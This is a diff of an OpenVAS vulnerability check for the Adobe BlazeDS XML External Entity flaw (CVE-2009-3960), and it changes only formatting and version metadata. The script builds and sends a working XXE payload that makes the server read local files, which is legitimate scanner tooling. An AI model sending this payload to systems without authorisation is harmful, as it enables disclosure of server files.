@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: sw_adobe_xxe_38197.nasl 7293 2017-09-27 08:49:48Z cfischer $
+# $Id: sw_adobe_xxe_38197.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # Adobe BlazeDS XML and XML External Entity Injection Vulnerabilities
 #
@@ -29,27 +29,27 @@
 
 if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105211");
- script_version ("$Revision: 7293 $");
- script_tag(name:"cvss_base", value:"4.3");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
- script_name("Adobe BlazeDS XML and XML External Entity Injection Vulnerabilities");
- script_bugtraq_id(38197);
- script_cve_id("CVE-2009-3960");
- script_tag(name:"last_modification", value:"$Date: 2017-09-27 10:49:48 +0200 (Wed, 27 Sep 2017) $");
- script_tag(name:"creation_date", value:"2015-02-11 14:56:42 +0100 (Wed, 11 Feb 2015)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2015 SCHUTZWERK GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_require_ports("Services/www", 80);
+  script_oid("1.3.6.1.4.1.25623.1.0.105211");
+  script_version("$Revision: 11291 $");
+  script_tag(name:"cvss_base", value:"4.3");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
+  script_name("Adobe BlazeDS XML and XML External Entity Injection Vulnerabilities");
+  script_bugtraq_id(38197);
+  script_cve_id("CVE-2009-3960");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2015-02-11 14:56:42 +0100 (Wed, 11 Feb 2015)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2015 SCHUTZWERK GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
+  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_require_ports("Services/www", 80);
 
- script_tag(name:"impact", value:"Attackers can exploit these issues to obtain sensitive information and carry out other attacks.");
- script_tag(name:"vuldetect", value:"Send an modificated GET request and check the response");
- script_tag(name:"solution", value:"Updates are available, please refer to the linked advisory.");
- script_tag(name:"summary", value:"Adobe BlazeDS is prone to an XML-injection vulnerability and an XML External Entity injection vulnerability.");
- script_tag(name:"affected", value:"The following applications are affected:
+  script_tag(name:"impact", value:"Attackers can exploit these issues to obtain sensitive information and carry out other attacks.");
+  script_tag(name:"vuldetect", value:"Send an modificated GET request and check the response");
+  script_tag(name:"solution", value:"Updates are available, please refer to the linked advisory.");
+  script_tag(name:"summary", value:"Adobe BlazeDS is prone to an XML-injection vulnerability and an XML External Entity injection vulnerability.");
+  script_tag(name:"affected", value:"The following applications are affected:
 
  BlazeDS 3.2 and earlier versions
  LiveCycle 9.0, 8.2.1, and 8.0.1
@@ -57,13 +57,13 @@ if(description)
  Flex Data Services 2.0.1
  ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2");
 
- script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38197");
- script_xref(name:"URL", value:"http://www.adobe.com/support/security/bulletins/apsb10-05.html");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38197");
+  script_xref(name:"URL", value:"http://www.adobe.com/support/security/bulletins/apsb10-05.html");
 
- script_tag(name:"solution_type", value:"VendorFix");
- script_tag(name:"qod_type", value:"remote_app");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_app");
 
- script_timeout(600);
+  script_timeout(600);
 
  exit(0);
 }
@@ -99,38 +99,38 @@ foreach url( urls ) {
 
   foreach file( keys( files ) ) {
 
-    xxe = '<?xml version="1.0" encoding="utf-8"?>' + 
-          '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/' + files[file] + '"> ]>' + 
-          '<amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx">' + 
-          '<body>' + 
-          '<object type="flex.messaging.messages.CommandMessage">' + 
-          '<traits>' + 
-          '<string>body</string><string>clientId</string><string>correlationId</string>' + 
-          '<string>destination</string><string>headers</string><string>messageId</string>' + 
-          '<string>operation</string><string>timestamp</string><string>timeToLive</string>' + 
-          '</traits><object><traits />' + 
-          '</object>' + 
-          '<null /><string /><string />' + 
-          '<object>' + 
-          '<traits>' + 
-          '<string>DSId</string><string>DSMessagingVersion</string>' + 
-          '</traits>' + 
-          '<string>nil</string><int>1</int>' + 
-          '</object>' + 
-          '<string>&xxe;</string>' + 
-          '<int>5</int><int>0</int><int>0</int>' + 
-          '</object>' + 
-          '</body>' + 
+    xxe = '<?xml version="1.0" encoding="utf-8"?>' +
+          '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/' + files[file] + '"> ]>' +
+          '<amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx">' +
+          '<body>' +
+          '<object type="flex.messaging.messages.CommandMessage">' +
+          '<traits>' +
+          '<string>body</string><string>clientId</string><string>correlationId</string>' +
+          '<string>destination</string><string>headers</string><string>messageId</string>' +
+          '<string>operation</string><string>timestamp</string><string>timeToLive</string>' +
+          '</traits><object><traits />' +
+          '</object>' +
+          '<null /><string /><string />' +
+          '<object>' +
+          '<traits>' +
+          '<string>DSId</string><string>DSMessagingVersion</string>' +
+          '</traits>' +
+          '<string>nil</string><int>1</int>' +
+          '</object>' +
+          '<string>&xxe;</string>' +
+          '<int>5</int><int>0</int><int>0</int>' +
+          '</object>' +
+          '</body>' +
           '</amfx>';
 
     len = strlen( xxe );
 
     req = 'GET ' + url + ' HTTP/1.1\r\n' +
-          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' + 
-          'Host: ' + host + '\r\n' + 
-          'Accept: */*\r\n' + 
+          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+          'Host: ' + host + '\r\n' +
+          'Accept: */*\r\n' +
           'Content-Length: ' + len + '\r\n' +
-          'Content-Type: application/x-amf\r\n' + 
+          'Content-Type: application/x-amf\r\n' +
           '\r\n' +
           xxe;
 
